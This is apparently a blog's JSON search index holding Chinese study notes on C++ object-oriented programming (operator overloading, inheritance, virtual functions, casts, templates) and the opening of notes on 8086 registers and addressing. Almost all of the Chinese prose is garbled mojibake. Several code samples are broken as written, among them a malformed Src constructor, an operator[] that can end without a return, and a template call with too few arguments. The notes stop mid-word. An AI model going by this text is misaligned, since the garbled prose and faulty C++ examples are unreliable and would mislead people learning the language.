å‡½æ•°è°ƒç”¨æ—¶ä»¥ç±»çš„å¯¹è±¡ä¸ºå½¢å‚æˆ–è¿”å›ç±»çš„å¯¹è±¡æ—¶ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆè°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼Œåœ¨å·²æœ‰å¯¹è±¡åŸºç¡€ä¸Šç”Ÿæˆæ–°å¯¹è±¡ æ‹·è´æ„é€ å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ„é€ å‡½æ•°ï¼Œå®ƒçš„å‚æ•°æ˜¯è¯­è¨€è§„å®šçš„ï¼Œæ˜¯åŒç±»å¯¹è±¡çš„å¸¸é‡å¼•ç”¨ class Person{ int id; â€¦â€¦ public: Person(const Person\u0026 src) { id = src.id; â€¦â€¦} â€¦â€¦ }; è¿ç®—ç¬¦é‡è½½ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:17","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- èµ‹å€¼è¿ç®—ç¬¦é‡è½½ ClassName\u0026 operator= (const ClassName\u0026 right){ if (this != \u0026right){ //é¿å…è‡ªå·±èµ‹å€¼ç»™è‡ªå·± //å°†rightå¯¹è±¡ä¸­çš„å†…å®¹å¤åˆ¶åˆ°å½“å‰å¯¹è±¡ä¸­ } return *this; } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:18","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- æµè¿ç®—ç¬¦é‡è½½ é‡è½½å‡½æ•°çš„å£°æ˜ï¼ˆä½œä¸ºå‹å…ƒï¼‰ class Test{ int id; public: friend istream\u0026 operator\u003e\u003e (istream\u0026 in, Test\u0026 dst); friend ostream\u0026 operator\u003c\u003c (ostream\u0026 out, const Test\u0026 src); }; é‡è½½å‡½æ•°å®ç° istream\u0026 operator\u003e\u003e (istream\u0026 in, Test\u0026 dst){ in \u003e\u003e dst.id; return in; } ostream\u0026 operator\u003c\u003c (ostream\u0026 out, Test\u0026 src){ out \u003c\u003c src.id \u003c\u003c endl; return out; } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:19","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- å‡½æ•°è¿ç®—ç¬¦()é‡è½½ é‡è½½å‡½æ•°å®ç° ReturnType operator() (Parameters){ â€¦â€¦ } className obj; obj(Real_parameters); //obj.operator() (Real_parameters); é‡è½½ç¤ºä¾‹ class Test{ public: int operator() (int a, int b){ return a + b; } }; int main(){ Test sum; cout\u003c\u003csum(1,2); return 0; } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:20","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- ä¸‹æ ‡è¿ç®—ç¬¦[]é‡è½½ é‡è½½å‡½æ•°è¿”å›ç±»å‹ è‹¥æ˜¯å¼•ç”¨ï¼Œåˆ™å¯å‡ºç°åœ¨ç­‰å·å·¦è¾¹ï¼Œå³obj[index]=value è‹¥ä¸æ˜¯å¼•ç”¨ï¼Œåˆ™åªèƒ½å‡ºç°åœ¨ç­‰å·å³è¾¹ï¼Œå³var=obj[index] é‡è½½å‡½æ•°ç¤ºä¾‹ #include\u003ciostream\u003e #include\u003cstring\u003e //strcmp using namespace std; char week_name[7][4] = {\"mon\", \"tu\", \"wed\", \"thu\", \"fri\", \"sat\", \"sun\"}; class WeekTemp{ int temp[7]; public: int\u0026 operator[] (const char* name){ for(int i = 0; i \u003c 7; i++){ if (strcmp (week_name[i], name) == 0) return temp[i]; } } }; int main(){ WeekTemp beijing; beijing[\"mon\"] = -3; beijing[\"tu\"] = -1; return 0; } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:21","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- è‡ªå¢å‡è¿ç®—ç¬¦++--é‡è½½ å‰ç¼€è¿ç®—ç¬¦é‡è½½å£°æ˜ ReturnType operator++() ReturnType operator--() åç¼€è¿ç®—ç¬¦é‡è½½å£°æ˜ ReturnType operator++(int dummy);//dummyä¸ºå“‘å…ƒï¼Œæ— å®é™…æ„ä¹‰ï¼Œåªä¸ºåŒºåˆ† ReturnType operator--(int dummy); é™æ€æˆå‘˜ä¸å¸¸é‡æˆå‘˜ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:22","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- é™æ€æˆå‘˜ ä»¥staticä¿®é¥°çš„æ•°æ®æˆå‘˜ï¼Œå±äºç±»ï¼Œè¢«æ‰€æœ‰å¯¹è±¡å…±äº« ä¸ºé™æ€æ•°æ®èµ‹åˆå€¼Type ClassName::static_var = value; è¿”å›å€¼ç±»å‹å‰é¢åŠ ä¸Šstaticä¿®é¥°çš„æˆå‘˜å‡½æ•°ï¼Œä¸èƒ½è°ƒç”¨éé™æ€æˆå‘˜å‡½æ•°ï¼Œæ²¡æœ‰thisæŒ‡é’ˆ ç±»çš„é™æ€æˆå‘˜ï¼ˆæ•°æ®ï¼Œå‡½æ•°ï¼‰æ—¢å¯ä»¥é€šè¿‡å¯¹è±¡è®¿é—®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç±»åæ¥è®¿é—® ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:23","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- å¸¸é‡æˆå‘˜ ä»¥constä¿®é¥°çš„æ•°æ®æˆå‘˜ï¼Œåœ¨å¯¹è±¡çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­ä¸å¯æ›´æ”¹ åªèƒ½åœ¨æ„é€ å‡½æ•°çš„åˆå§‹åŒ–åˆ—è¡¨ä¸­è¢«è®¾ç½®ï¼Œä¸å…è®¸åœ¨å‡½æ•°ä½“ä¸­é€šè¿‡èµ‹å€¼æ¥è®¾ç½® ç”¨constä¿®é¥°æˆå‘˜å‡½æ•°ï¼Œåˆ™è¯¥æˆå‘˜å‡½æ•°åœ¨å®ç°æ—¶ä¸èƒ½æœ‰æ”¹å˜å¯¹è±¡çŠ¶æ€ï¼ˆå†…å®¹ï¼‰çš„è¯­å¥ è‹¥å¯¹è±¡è¢«å®šä¹‰ä¸ºå¸¸é‡ï¼Œåˆ™å®ƒåªèƒ½è°ƒç”¨ä»¥constä¿®é¥°çš„æˆå‘˜å‡½æ•°ï¼Œæ™®é€šå‡½æ•°ä¸å…è®¸è°ƒç”¨ ç§»åŠ¨ï¼ˆæ‹·è´ï¼‰æ„é€ å‡½æ•° ç”¨æ¥â€œå·â€ä¸´æ—¶å˜é‡\"çš„èµ„æºï¼Œæ²¡æœ‰åå­—å¦‚è¿”å›å€¼ç­‰çš„å˜é‡ è¯­æ³•ClassName(ClassName\u0026\u0026) ç¤ºä¾‹ class Test{ public: int* buf; Test(Test\u0026\u0026 t) : buf(t.buf){ t.buf = nullptr; } } ç±»ä¸­æˆå‘˜å‡½æ•°default ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:24","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„æˆå‘˜å‡½æ•° é»˜è®¤æ„é€ å‡½æ•°ï¼šç©ºå‡½æ•°ï¼Œä»€ä¹ˆä¹Ÿä¸åš ææ„å‡½æ•°ï¼šç©ºå‡½æ•°ï¼Œä»€ä¹ˆä¹Ÿä¸åš æ‹·è´æ„é€ å‡½æ•°ï¼šæŒ‰bitä½å¤åˆ¶å¯¹è±¡æ‰€å å†…å­˜çš„å†…å®¹ ç§»åŠ¨æ„é€ å‡½æ•°ï¼šåŒä¸Š èµ‹å€¼è¿ç®—ç¬¦é‡è½½ï¼šåŒä¸Š æ³¨æ„ï¼šè‹¥ç”¨æˆ·å®šä¹‰äº†ä¸Šè¿°æŸä¸ªæˆå‘˜å‡½æ•°ï¼Œåˆ™ç¼–è¯‘å™¨ä¸å†è‡ªåŠ¨ç”Ÿæˆç›¸åº”çš„é»˜è®¤å®ç° ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:25","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- åŒæ—¶ä½¿ç”¨ç¼–è¯‘å™¨æä¾›çš„æˆå‘˜å‡½æ•° class T{ int data; public: T() = default; T(int i) : data(i) {} }; ç»§æ‰¿ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:26","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- å«ä¹‰ åœ¨å·²æœ‰ç±»(Base class)çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡ç»§æ‰¿æ¥å®šä¹‰æ–°çš„ç±»(Derived class) ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:27","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- ç»§æ‰¿æ–¹å¼ privateç»§æ‰¿ï¼ˆç¼ºçœç»§æ‰¿ï¼‰ class Derived : [private] Base{â€¦â€¦}; publicç»§æ‰¿ class Derived : public Base{â€¦â€¦}; ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:28","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- ç»§æ‰¿åŸºç±»æ„é€ å‡½æ•° class Base{ int data; public: Base(int i) : data(i) {â€¦â€¦} }; class Derive : public Base{ int data; using Base::Base; //ç»§æ‰¿åŸºç±»æ„é€ å‡½æ•° } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:29","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- æ´¾ç”Ÿç±»ä¸­çš„åŸºç±»æˆå‘˜ æ´¾ç”Ÿç±»ä¸­åŒ…å«ä»åŸºç±»ç»§æ‰¿æ¥çš„æ•°æ®æˆå‘˜ï¼Œå®ƒä»¬æ„æˆäº†â€œåŸºç±»å­å¯¹è±¡â€ åŸºç±»ä¸­çš„ç§æœ‰æˆå‘˜privateï¼Œä¸å…è®¸åœ¨æ´¾ç”Ÿç±»æˆå‘˜å‡½æ•°ä¸­è¢«è®¿é—®ï¼Œä¹Ÿä¸å…è®¸æ´¾ç”Ÿç±»çš„å¯¹è±¡è®¿é—® åŸºç±»ä¸­çš„å…¬æœ‰æˆå‘˜public pubilcç»§æ‰¿ï¼šæˆä¸ºæ´¾ç”Ÿç±»çš„å…¬æœ‰æˆå‘˜ privateç»§æ‰¿ï¼šåªèƒ½ä¾›æ´¾ç”Ÿç±»æˆå‘˜å‡½æ•°è®¿é—®ï¼Œä¸èƒ½è¢«æ´¾ç”Ÿç±»çš„å¯¹è±¡è®¿é—® åŸºç±»ä¸­çš„ä¿æŠ¤æˆå‘˜protected publicç»§æ‰¿ï¼šå¯ä»¥è®¿é—® privateç»§æ‰¿ï¼šå˜æˆprivateæˆå‘˜ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:30","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- æ´¾ç”Ÿç±»ä¸­å‡½æ•°é‡å†™ï¼ˆoverrideï¼‰ åŸºç±»å·²å®šä¹‰çš„æˆå‘˜å‡½æ•°ï¼Œåœ¨æ´¾ç”Ÿç±»ä¸­å¯ä»¥é‡æ–°å®šä¹‰ï¼Œç§°ä¸ºâ€œå‡½æ•°é‡å†™â€ é‡å†™çš„å‡½æ•°å‚æ•°ï¼Œè¿”å›å€¼åº”ä¸åŸå‡½æ•°ä¸€æ¨¡ä¸€æ · é‡å†™å‘ç”Ÿæ—¶ï¼ŒåŸºç±»ä¸­è¯¥æˆå‘˜å‡½æ•°çš„å…¶ä»–é‡è½½å‡½æ•°éƒ½å°†è¢«å±è”½æ‰ï¼Œä¸èƒ½æä¾›ç»™æ´¾ç”Ÿç±»å¯¹è±¡ä½¿ç”¨ å¯ä»¥åœ¨æ´¾ç”Ÿç±»ä¸­é€šè¿‡using ç±»å::æˆå‘˜å‡½æ•°ååœ¨æ´¾ç”Ÿç±»ä¸­æ¢å¤åˆ¶å®šçš„æˆå‘˜å‡½æ•°ï¼Œå»æ‰å±è”½ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:31","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- å‘ä¸Šæ˜ å°„å’Œå‘ä¸‹æ˜ å°„ å‘ä¸Šæ˜ å°„ï¼šç”±æ´¾ç”Ÿç±»å¯¹è±¡è½¬æ¢ä¸ºåŸºç±»å¯¹è±¡ å‘ä¸Šæ˜ å°„å¯ä»¥ç”±ç¼–è¯‘å™¨è‡ªåŠ¨å®Œæˆï¼Œæ˜¯ä¸€ç§éšå¼çš„è‡ªåŠ¨è½¬æ¢ å‡¡æ˜¯æ¥å—åŸºç±»å¯¹è±¡çš„åœ°æ–¹ï¼ˆå¦‚å‡½æ•°å‚æ•°ï¼‰ï¼Œéƒ½å¯ä»¥ä½¿ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å°†æ´¾ç”Ÿç±»å¯¹è±¡è½¬æ¢ä¸ºåŸºç±»å¯¹è±¡ class Base{ public: void print(){cout \u003c\u003c \"Base::print()\" \u003c\u003c endl;} }; class Derive : public Base{ public: void print(){cout \u003c\u003c \"Derive::print()\" \u003c\u003c endl;} }; void fun(Base obj){ obj.print(); } int main(){ Derive d; d.print(); //Derive::print() fun(d); //Base::print()å‘ç”Ÿäº†å‘ä¸Šæ˜ å°„ return 0; } å‘ä¸‹æ˜ å°„ï¼šç”±åŸºç±»å¯¹è±¡è½¬æ¢ä¸ºæ´¾ç”Ÿç±»å¯¹è±¡ ä½¿ç”¨è™šå‡½æ•°ï¼Œè®©ç¼–è¯‘å™¨è‡ªåŠ¨é€‰æ‹©åˆé€‚çš„å‡½æ•° class Base{ public: virtual void print(){cout \u003c\u003c \"Base::print()\" \u003c\u003c endl;} }; class Derive : public Base{ public: void print(){cout \u003c\u003c \"Derive::print()\" \u003c\u003c endl;} }; void fun(Base\u0026 obj){ //obj å¿…é¡»æ˜¯å¯¹Baseç±»çš„å¼•ç”¨ obj.print(); } int main(){ Derive d; d.print(); //Derive::print() fun(d); //Derive::print()ç¼–è¯‘å™¨æ ¹æ®dçš„ç±»å‹é€‰æ‹©äº†åˆé€‚çš„å‡½æ•° return 0; } è™šææ„å‡½æ•° class B{ public: virtual void show(){cout \u003c\u003c \"B.show()\";} virtual ~B(){cout \u003c\u003c \"~B()\";} }; class D : public B{ public: void show(){cout \u003c\u003c \"D.show()\";} ~D(){cout \u003c\u003c \"~D()\";} }; void test(B* ptr){ //è‹¥åˆ é™¤virtual ptr -\u003e show(); //è¿è¡Œç»“æœ è¿è¡Œç»“æœ } //D.show() D.show() int main(){ //~D() ~B() B* ptr = new D; //~B() test(ptr); delete ptr; return 0; } ç¦æ­¢é‡å†™çš„è™šå‡½æ•°ï¼ˆfinalå…³é”®å­—ï¼‰ class A{ public: virtual void fun() = 0; }; class B : public A{ public: void fun() final; //åç»­å­ç±»ä¸å¯é‡å†™æ­¤æ¥å£å‡½æ•° }; class C ï¼špublic B{ public: void fun(); //ç¼–è¯‘é”™è¯¯ }; çº¯è™šå‡½æ•° fun()=0 åŒ…å«çº¯è™šå‡½æ•°çš„ç±»ä¸å…è®¸å®šä¹‰å¯¹è±¡ï¼Œåªèƒ½ä¸ºå­ç±»æä¾›æ¥å£ ä¸åŒç±»ä¹‹é—´è‡ªåŠ¨ç±»å‹è½¬æ¢ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:32","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- åœ¨æºç±»ä¸­å®šä¹‰â€œç›®æ ‡ç±»å‹è½¬æ¢è¿ç®—ç¬¦â€œ class Dst{ public: Dst(){cout \u003c\u003c \"Dst::Dst()\" \u003c\u003c endl;} }; class Src{ public: Src(cout \u003c\u003c \"Src::Src() \u003c\u003c endl\" \u003c\u003c endl;) operator Dst() const{ cout \u003c\u003c \"src::operator Dst() called\" \u003c\u003c endl; return Dst(); } }; ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:33","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- åœ¨ç›®æ ‡ç±»ä¸­å®šä¹‰â€œæºç±»å¯¹è±¡åšå‚æ•°çš„æ„é€ å‡½æ•°â€ class Src; //å‰ç½®ç±»å‹å£°æ˜ class Dst{ public: Dst() {cout \u003c\u003c \"Dst::Dst()\" \u003c\u003c endl;} Dst(const Src\u0026 s){ cout \u003c\u003c \"Dst::Dst(const Src\u0026)\" \u003c\u003cendl; } }; class Src{ public: Src(){cout \u003c\u003c \"Src::Src()\" \u003c\u003c endl;} } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:34","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- ç¦æ­¢è‡ªåŠ¨ç±»å‹è½¬æ¢ åˆ†åˆ«å¯¹åº”ä»¥ä¸Šä¸¤ç§æ–¹æ³•ï¼ŒåŠ å…³é”®è¯explicit class Dst{ public: Dst(){cout \u003c\u003c \"Dst::Dst()\" \u003c\u003c endl;} }; class Src{ public: Src(cout \u003c\u003c \"Src::Src() \u003c\u003c endl\" \u003c\u003c endl;) explicit operator Dst() const{ cout \u003c\u003c \"src::operator Dst() called\" \u003c\u003c endl; return Dst(); } }; class Src; //å‰ç½®ç±»å‹å£°æ˜ class Dst{ public: Dst() {cout \u003c\u003c \"Dst::Dst()\" \u003c\u003c endl;} explicit Dst(const Src\u0026 s){ cout \u003c\u003c \"Dst::Dst(const Src\u0026)\" \u003c\u003cendl; } }; class Src{ public: Src(){cout \u003c\u003c \"Src::Src()\" \u003c\u003c endl;} } åˆ©ç”¨=deleteç¦æ­¢è‡ªåŠ¨ç±»å‹è½¬æ¢ class T{ public: T (int){} T (char) = delete; } void fun(T t) {} int main(){ fun(1); fun('x'); //ç¼–è¯‘ä¸é€šè¿‡ } å¼ºåˆ¶ç±»å‹è½¬æ¢ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:35","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- dynamic_cast\u003cDst_Type\u003e(Src_var) Src_varå¿…é¡»æ˜¯å¼•ç”¨æˆ–æŒ‡é’ˆç±»å‹ï¼ŒDst_Typeç±»ä¸­å«æœ‰è™šå‡½æ•°ï¼Œå¦åˆ™ä¼šæœ‰ç¼–è¯‘é”™è¯¯ è‹¥ç›®æ ‡ç±»ä¸æºç±»ä¹‹é—´æ²¡æœ‰ç»§æ‰¿å…³ç³»ï¼Œåˆ™è½¬æ¢å¤±è´¥ï¼Œè¿”å›ç©ºæŒ‡é’ˆ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:36","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- static_cast\u003cDst_Type\u003e(Src_var) åŸºç±»å¯¹è±¡ä¸èƒ½è½¬æ¢æˆæ´¾ç”Ÿç±»å¯¹è±¡ï¼Œä½†åŸºç±»æŒ‡é’ˆå¯ä»¥è½¬æ¢ä¸ºæ´¾ç”Ÿç±»æŒ‡é’ˆ æ´¾ç”Ÿç±»å¯¹è±¡ï¼ˆæŒ‡é’ˆï¼‰å¯ä»¥è½¬æ¢ä¸ºåŸºç±»å¯¹è±¡ï¼ˆæŒ‡é’ˆï¼‰ æ²¡æœ‰ç»§æ‰¿å…³ç³»çš„ç±»ä¹‹é—´ï¼Œå¿…é¡»æœ‰è½¬æ¢é€”å¾„æ‰èƒ½è¿›è¡Œè½¬æ¢ å‡½æ•°æ¨¡æ¿ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:37","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- å‡½æ•°æ¨¡æ¿çš„å®šä¹‰ template\u003ctypename T\u003e è¿”å›ç±»å‹ å‡½æ•°åç§°ï¼ˆå‡½æ•°å‚æ•°ï¼‰ template\u003ctypename T\u003e T sum(T a, T b){return a + b;} ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:38","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- å‡½æ•°æ¨¡æ¿å‚æ•°å¯èµ‹é»˜è®¤å€¼ template\u003ctypename T0 = float, typename T1, typename T2 = float, typename T3, typename T4\u003e T0 fun(T1 v1, T2 v2, T3 v3, T4 v4){â€¦â€¦} â€¦â€¦ fun(1,2,3); fun('a','b','cdf'); ç±»æ¨¡æ¿ åŸºæœ¬å®šä¹‰ template\u003ctypename T\u003eclass A{ T data; public: void print(){cout \u003c\u003c data;} }; ç±»æ¨¡æ¿ä½¿ç”¨æµç¨‹ ç±»æ¨¡æ¿â€”å®ä¾‹åŒ–â€”\u003eç±»â€”å®ä¾‹åŒ–â€”\u003eå¯¹è±¡ ç±»æ¨¡æ¿å‚æ•° ç±»å‹å‚æ•°ï¼šä½¿ç”¨typenameæˆ–classæ ‡è®° éç±»å‹å‚æ•°ï¼šæ•´æ•°ï¼Œæšä¸¾ï¼ŒæŒ‡é’ˆï¼ˆæŒ‡å‘å¯¹è±¡æˆ–å‡½æ•°ï¼‰ï¼Œå¼•ç”¨ï¼ˆå¼•ç”¨å¯¹è±¡æˆ–å‡½æ•°ï¼‰ template\u003ctypename T, unsigned size\u003e class array{ T elems[size]; â€¦â€¦ }; array\u003cchar,10\u003e array0; //ç”¨ç±»æ¨¡æ¿å®ä¾‹å®šä¹‰å¯¹è±¡ æ¨¡æ¿å‚æ•°æ˜¯å¦ä¸€ä¸ªç±»æ¨¡æ¿ template\u003ctypename T, template\u003ctypename TT0, typename TT1\u003e class A\u003e struct Foo{ A \u003cT,T\u003ebar; }; æ¨¡æ¿ç‰¹åŒ– ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:39","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- å‡½æ•°æ¨¡æ¿ç‰¹åŒ– template\u003ctypename T\u003e T sum(T a, T b){ return a+b; } template\u003c\u003e char* sum(char* a, char* b){ char* p = new char[strlen(a) + strlen(b) + 1]; strcpy(p, a); strcat(p, b); return p; } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:40","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- ç±»æ¨¡æ¿ç‰¹åŒ– //é€šç”¨ç±»æ¨¡æ¿ template\u003cclass T1, class T2\u003e class A{â€¦â€¦}; //éƒ¨åˆ†ç‰¹åŒ–çš„æ¨¡æ¿ç±»ï¼šç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šä¸ºintï¼ˆåç‰¹åŒ–ï¼‰ template\u003cclass T1\u003e class A \u003cT1, int\u003e{â€¦â€¦}; //æŒ‡å®šæ‰€æœ‰ç±»å‹ template\u003c\u003e class A \u003cint, int\u003e {â€¦â€¦}; ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:41","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Binary"],"content":"8086CPUæ±‡ç¼– ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:0","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- 8086CPUæœ‰14ä¸ªå¯„å­˜å™¨ æ•°æ®å¯„å­˜å™¨ï¼šAX,BX,CX,DX å…¶ä»–å¯„å­˜å™¨ï¼šCS:IP,SS:SP,DS,ES,SI,DI,BP,FLAG(PSW) 8086CPUæ¯ä¸€ä¸ªå¯„å­˜å™¨éƒ½æ˜¯16ä½çš„ï¼Œå­˜æ”¾2ä¸ªå­—èŠ‚ é€šç”¨å¯„å­˜å™¨éƒ½å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªç‹¬ç«‹çš„8ä½å¯„å­˜å™¨ä½¿ç”¨ï¼Œå¦‚ALï¼ˆä½8ä½ï¼‰,AHï¼ˆé«˜8ä½ï¼‰ 16ä½CPUç‰¹å¾ï¼š è¿ç®—å™¨ä¸€æ¬¡æœ€å¤šå¯ä»¥å¤„ç†16ä½æ•°æ® å¯„å­˜å™¨çš„æœ€å¤§å®½åº¦ä¸º16ä½ å¯„å­˜å™¨å’Œè¿ç®—å™¨ä¹‹é—´çš„é€šè·¯æ˜¯16ä½çš„ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:1","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- 8086CPUæœ‰20æ ¹åœ°å€æ€»çº¿ 8086CPUé‡‡ç”¨åœ¨å†…éƒ¨ç”¨ä¸¤ä¸ª16ä½åœ°å€åˆæˆï¼ˆåœ°å€åŠ æ³•å™¨ï¼‰çš„æ–¹æ³•å½¢æˆä¸€ä¸ª20ä½çš„ç‰©ç†åœ°å€ ç‰©ç†åœ°å€ = æ®µåœ°å€ * 16 + åç§»åœ°å€ï¼ˆ16è¿›åˆ¶åœ°å€å·¦ç§»ä¸€ä½ï¼‰ æ¨è®ºï¼šåç§»åœ°å€ä¸º16ä½ï¼ˆ0-FFFFHï¼‰â€“\u003eä¸€ä¸ªæ®µæœ€å¤§é•¿åº¦ä½64kbï¼ˆ$2^{16}$) ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:2","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- CS(Code Segment):IP(Instruction Pointer) CS:IPæŒ‡å‘CPUå½“å‰æ‰€è¦æ‰§è¡ŒæŒ‡ä»¤çš„åœ°å€ IPé€’å¢å™¨ï¼šæ‰§è¡Œå®Œä¸€æ¡æŒ‡ä»¤åï¼ŒIPè‡ªåŠ¨é€’å¢è¯¥æŒ‡ä»¤çš„é•¿åº¦ï¼Œè·³åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ 8086CPUåŠ 